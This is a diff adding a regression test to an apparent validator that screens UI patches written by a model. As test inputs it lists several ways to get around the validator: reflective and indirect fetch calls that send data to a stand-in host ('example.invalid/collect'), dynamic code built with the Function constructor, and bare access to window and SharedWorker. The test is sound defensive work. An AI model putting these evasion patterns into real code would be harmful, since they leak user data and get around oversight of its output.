@@ -353,3 +353,20 @@ test('model-generated UI edits cannot reuse the existing Supabase client', () =>
   });
   assert.equal(validateModelPatch({ response: benign, source }).status, 'proposed');
 });
+
+test('model validator rejects reflective and bare browser-global access, not just direct calls', () => {
+  for (const replace of [
+    'const leak = Reflect.get(globalThis, "fetch")("https://example.invalid/collect");',
+    'const transport = (0, fetch); transport("https://example.invalid/collect");',
+    'const dynamic = (() => {}).constructor("return 2")();',
+    'const client = window;',
+    'const worker = SharedWorker;'
+  ]) {
+    const response = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace,
+      explanation: 'synthetic reflective bypass regression' });
+    assert.equal(validateModelPatch({ response, source }).status, 'rejected', replace);
+  }
+  const safe = JSON.stringify({ path: MODEL_ALLOWED_PATH, find,
+    replace: '  const sample = 106;', explanation: 'benign edit' });
+  assert.equal(validateModelPatch({ response: safe, source }).status, 'proposed');
+});
